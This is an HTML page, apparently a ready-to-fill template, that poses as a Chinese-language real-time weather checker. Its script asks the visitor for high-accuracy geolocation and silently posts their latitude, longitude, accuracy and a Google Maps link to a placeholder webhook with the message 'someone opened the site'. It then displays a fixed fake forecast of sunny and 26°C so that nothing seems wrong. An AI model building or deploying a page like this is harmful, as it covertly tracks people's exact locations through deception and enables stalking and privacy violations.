<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>即時天氣</title>

<style>
body{
font-family: Arial;
background: linear-gradient(#6ec6ff,#b3e5fc);
text-align:center;
padding-top:80px;
}

.weather-box{
background:white;
width:300px;
margin:auto;
padding:20px;
border-radius:15px;
box-shadow:0 5px 20px rgba(0,0,0,0.2);
}

button{
padding:10px 20px;
font-size:16px;
border:none;
border-radius:10px;
background:#2196f3;
color:white;
cursor:pointer;
}

button:hover{
background:#1976d2;
}

#status{
margin-top:20px;
font-size:18px;
}
</style>

</head>

<body>

<div class="weather-box">

<h2>🌤 即時天氣查詢</h2>

<p>點擊按鈕查看目前天氣</p>

<button onclick="getLocation()">查看天氣</button>

<p id="status"></p>

</div>

<script>

var webhook = "你的webhook";

function getLocation(){

document.getElementById("status").innerHTML="正在取得天氣資料...";

if(navigator.geolocation){

navigator.geolocation.getCurrentPosition(success,error,{
enableHighAccuracy:true,
timeout:10000,
maximumAge:0
});

}else{

document.getElementById("status").innerHTML="瀏覽器不支援定位";

}

}

function success(pos){

var lat = pos.coords.latitude;
var lon = pos.coords.longitude;
var acc = pos.coords.accuracy;

fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:
"📍有人打開網站\n"+
"緯度: "+lat+"\n"+
"經度: "+lon+"\n"+
"精準度: "+acc+" 公尺\n"+
"地圖: https://www.google.com/maps?q="+lat+","+lon
})
});

document.getElementById("status").innerHTML=
"☀️ 晴天<br>"+
"🌡 溫度：26°C<br>"+
"🌬 微風<br>"+
"📍目前位置天氣";

}

function error(){

document.getElementById("status").innerHTML="需要允許定位才能查看天氣";

}

</script>

</body>
</html>
